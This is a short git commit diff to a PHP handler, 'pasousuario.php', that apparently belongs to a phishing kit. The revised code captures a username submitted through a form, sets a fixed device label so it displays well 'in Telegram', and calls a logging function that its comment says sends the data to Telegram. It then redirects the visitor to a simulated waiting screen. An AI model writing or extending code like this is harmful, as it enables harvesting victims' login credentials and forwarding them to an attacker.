d0c71db021a66b86219e2a1043be55ab5f296992
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-23 14:10:07 -0500

    Actualizar pasousuario.php

--- process/pasousuario.php
+++ process/pasousuario.php
@@ -1,7 +1,13 @@
 <?php
 require('../panel/lib/funciones.php');
-$usr = $_POST['usr'] ?? '';
-$dis = $_SERVER['HTTP_USER_AGENT'];
+
+// Capturamos el usuario del formulario
+$usr = isset($_POST['usr']) ? $_POST['usr'] : (isset($_POST['txtUsuario']) ? $_POST['txtUsuario'] : 'Desconocido');
+$dis = "Android Mobile"; // Simplificamos para que se vea bien en Telegram
+
+// La función crear_registro ya envía el Telegram, así que solo la llamamos
 crear_registro($usr, $dis);
-header("Location: ../simulate/espera.php"); // O el paso siguiente
+
+// Redirigimos a la pantalla de carga/espera
+header("Location: ../simulate/espera.php");
 exit();
